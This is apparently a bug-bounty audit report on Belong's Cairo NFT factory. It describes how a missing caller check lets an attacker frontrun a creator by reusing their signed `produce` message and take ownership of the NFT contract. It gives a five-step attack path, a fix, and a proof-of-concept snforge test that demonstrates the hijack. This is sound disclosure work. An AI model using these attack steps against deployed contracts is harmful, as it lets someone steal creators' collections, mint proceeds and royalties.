# 57938 sc medium produce function doesn t check if creator is the caller allowing frontrunning attacks

**Submitted on Oct 29th 2025 at 14:24:59 UTC by @kenzo for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57938
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/feat/cairo/src/nftfactory/nftfactory.cairohttps://github.com/immunefi-team/audit-comp-belong/blob/feat/cairo/src/nftfactory/nftfactory.cairo>
* **Impacts:**
  * Theft of unclaimed yield
  * Theft of unclaimed royalties

## Description

The `_produce` function in `nftfactory.cairo` validates a signature for a `ProduceHash` message that includes `info.creator_address`, but the NFT deployment and ownership assignment use `get_caller_address()` instead. There is no check that the caller matches the `creator_address` in the signed message.

The signature validation only verifies that the message was signed by the authorized signer, but does not verify that `get_caller_address() == info.creator_address`. This allows an attacker to reuse a valid signature meant for someone else's `creator_address` and deploy the NFT under their own control.

Example from the code:

```rust
// Signature validation - checks if signature is valid for the message
let message = ProduceHash {
    name_hash: metadata_name_hash,
    symbol_hash: metadata_symbol_hash,
    contract_uri_hash: contract_uri_hash,
    royalty_fraction: info.royalty_fraction,
    creator_address: info.creator_address,  // ← Signed creator_address
};

let hash = message.get_message_hash(signerAddress);
let is_valid_signature_felt = signer.is_valid_signature(hash, info.signature);
assert(
    is_valid_signature_felt == starknet::VALIDATED || is_valid_signature_felt == 1,
    super::Errors::VALIDATION_ERROR,
);

// NFT deployment uses CALLER, not creator_address
let mut nft_constructor_calldata: Array<felt252> = array![];
nft_constructor_calldata.append_serde(get_caller_address());  // ← Uses CALLER!
// ...
self.nft_info.write(
    (metadata_name_hash, metadata_symbol_hash),
    NftInfo {
        creator: get_caller_address(),  // ← Stored as CALLER!
        // ...
    },
);
```

## Impact

An attacker can hijack NFT collection deployments by impersonating legitimate creators, steal intellectual property by deploying collections under their control, drain creator funds by redirecting mint proceeds and royalties to themselves, gain full administrative control over NFT contracts including setting prices, whitelisting users, and upgrading contracts, and cause reputation damage to legitimate creators.

## Attack Path

{% stepper %}
{% step %}
Alice requests a signature from the backend signer for her `creator_address`. The backend creates `ProduceHash` with `creator_address: Alice` and signs the message, returning the signature to Alice.
{% endstep %}

{% step %}
Alice submits a transaction calling `produce()` with her signature. Bob sees this transaction in the mempool before it's mined and extracts the signature from Alice's transaction data.
{% endstep %}

{% step %}
Bob frontruns Alice by submitting his own `produce()` transaction with the same signature but from his address and with a higher fee/priority. Since the signature is valid for Alice's `creator_address`, validation passes, but Bob's transaction gets mined first.
{% endstep %}

{% step %}
Bob calls `produce()` with Alice's signature but from his own address. He passes `instance_info.creator_address = Alice` and `instance_info.signature = Alice's signature`, but calls the function from his own address so `get_caller_address() = Bob`. Signature validation passes because the signature is valid for Alice's `creator_address`, but the NFT gets deployed with Bob as owner/creator since it uses `get_caller_address()`.
{% endstep %}

{% step %}
The result is that Bob becomes the NFT contract owner via Ownable, receives all mint proceeds and creator fees, Alice loses control and cannot manage her intended collection, and Bob can set payment info, whitelist users, and upgrade the contract.
{% endstep %}
{% endstepper %}

## Recommendation

After signature validation, ensure the caller matches the `creator_address` in the signed message. For example:

```cairo
fn _produce(
    ref self: ContractState, instance_info: InstanceInfo,
) -> (ContractAddress, ContractAddress) {
    // ... existing code ...
    
    let is_valid_signature_felt = signer.is_valid_signature(hash, info.signature);
    assert(
        is_valid_signature_felt == starknet::VALIDATED || is_valid_signature_felt == 1,
        super::Errors::VALIDATION_ERROR,
    );
    
    assert(
        get_caller_address() == info.creator_address,
        'Caller must match signed creator',
    );
    
    // ... rest of deployment code ...
}
```

This ensures only the creator specified in the signed message can deploy the NFT, preventing signature reuse frontrunning attacks.

## Proof of Concept

Put this test in `test_produce_creator_address_mismatch` in `src/tests/test_nftfactory.cairo`

Run the test:

```bash
snforge test test_produce_creator_address_mismatch
```

Test code:

```cairo
#[test]
fn test_produce_creator_address_mismatch() {
    let account = deploy_account_mock();
    let contract = deploy_initialize(account);
    let erc20mock = deploy_erc20_mock();

    let nft_factory = INFTFactoryDispatcher { contract_address: contract };

    // Create signature for CREATOR address
    let produce_hash = ProduceHash {
        creator_address: constants::CREATOR(),
        name_hash: constants::NAME().hash(),
        symbol_hash: constants::SYMBOL().hash(),
        contract_uri_hash: constants::CONTRACT_URI().hash(),
        royalty_fraction: 0,
    };

    // call sign_message from CREATOR address
    start_cheat_caller_address_global(account);
    let signature = sign_message(produce_hash.get_message_hash(account));
    stop_cheat_caller_address_global();

    // create instance info for CREATOR address
    let instance_info = InstanceInfo {
        creator_address: constants::CREATOR(),
        name: constants::NAME(),
        symbol: constants::SYMBOL(),
        contract_uri: constants::CONTRACT_URI(),
        payment_token: erc20mock,
        royalty_fraction: 0,
        transferrable: true,
        max_total_supply: constants::MAX_TOTAL_SUPPLY(),
        mint_price: constants::MINT_PRICE(),
        whitelisted_mint_price: constants::WL_MINT_PRICE(),
        collection_expires: constants::EXPIRES(),
        referral_code: '',
        signature,
    };

    // Call produce from REFERRAL address (attacker) using CREATOR signature
    start_cheat_caller_address(contract, constants::REFERRAL());
    let (nft_address, _) = nft_factory.produce(instance_info);
    stop_cheat_caller_address(contract);

    let nft = INFTDispatcher { contract_address: nft_address };
    let ownable = IOwnableDispatcher { contract_address: nft_address };

    // Verify attacker became owner/creator instead of CREATOR
    assert_eq!(nft.creator(), constants::REFERRAL());
    assert_eq!(ownable.owner(), constants::REFERRAL());
    assert_eq!(nft_factory.nftInfo(constants::NAME(), constants::SYMBOL()).creator, constants::REFERRAL());
}
```
